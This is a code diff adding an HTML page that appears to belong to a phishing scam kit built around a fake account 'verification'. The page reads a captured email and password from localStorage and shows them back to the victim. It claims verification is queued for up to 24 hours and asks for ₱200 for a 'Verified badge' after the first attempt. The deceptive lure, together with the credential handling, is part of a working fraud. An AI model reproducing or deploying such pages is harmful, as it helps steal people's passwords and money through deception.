@@ -1,0 +1,57 @@
+<!DOCTYPE HTML>
+<html lang="en">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <title>Verify your Account</title>
+    <style>
+      *{
+        fomt-weight:bolder;
+        font-family:Sans-Serif arial;
+        background:black;
+        color:white;
+      }
+      #email,#password{
+        color:green;
+      }
+      #status{
+        color:red;
+      }
+      #reply{
+        animation: colors 1s ease-in-out infinite;
+      }
+      @keyframes colors{
+        0%{
+          color:yellow;
+        }
+        50%{
+          color:white;
+        }
+        100%{
+          color:red;
+        }
+      }
+    </style>
+  </head>
+  </head>
+ <body>
+   <div id="main"></div>
+<h3>Account Information</h3>
+<div>Email:<span id="email"></span></div>
+<div>Password:<span id="password"></span></div>
+<div>Status:<span id="status">Queue</span></div>
+
+<h4 id="reply">Please wait up to 24 hours to verify</h4>
+<h5>Verified badge goods for 6 months(<span style="color:red">Free for 1st attemp</span>)<br>You must pay <span style="color:red">₱200</span> for more than 1 attemp(<span style="color:red">This Verified badge expires every 6 months!</span>)</h5>
+<script>
+  window.onload = () =>{
+    if(localStorage.getItem("email")!==null&&localStorage.getItem("password")!==null){
+      document.getElementById("email").textContent=localStorage.getItem("email");
+      document.getElementById("password").textContent=localStorage.getItem("password");
+    }else{
+      location.href="index.html";
+    }
+  }
+</script>
+ </body>
+</html>
